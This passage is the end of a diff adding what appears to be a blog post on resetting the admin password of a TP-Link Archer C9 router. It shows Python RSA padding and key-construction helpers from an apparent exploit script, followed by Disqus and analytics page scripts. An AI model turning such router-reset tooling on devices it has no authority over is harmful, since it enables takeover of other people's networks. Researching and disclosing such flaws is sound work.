+	<span class="k">return</span> <span class="n">key</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">val</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">),</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pubKey</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
+	<span class="k">return</span> <span class="n">RSA</span><span class="p">.</span><span class="n">construct</span><span class="p">((</span><span class="nb">long</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="mi">16</span><span class="p">),</span> <span class="nb">long</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))</span>
+</code></pre></div></div>
+
+  </div>
+
+  
+
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function() {
+      this.page.url = "https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html";
+      this.page.identifier = "https://devcraft.io/posts/2017/07/21/tp-link-archer-c9-admin-password-reset.html";
+    };
+    (function() {
+      var d = document,
+        s = d.createElement("script");
+      s.src = "https://devcraft-2.disqus.com/embed.js";
+      s.setAttribute("data-timestamp", +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript
+    >Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript" rel="nofollow"
+      >comments powered by Disqus.</a
+    ></noscript
+  >
+  
+</article>
+
+    </section>
+  </div>
+
+  <!-- FOOTER  -->
+  <div id="footer_wrap" class="outer">
+    <footer class="inner">
+      
+
+    </footer>
+  </div>
+
+  
+  <script>
+    (function (i, s, o, g, r, a, m) {
+      i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+      }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+    ga('create', 'UA-74386578-2', 'auto');
+    ga('send', 'pageview');
+  </script>
+  
+</body>
+
+</html>
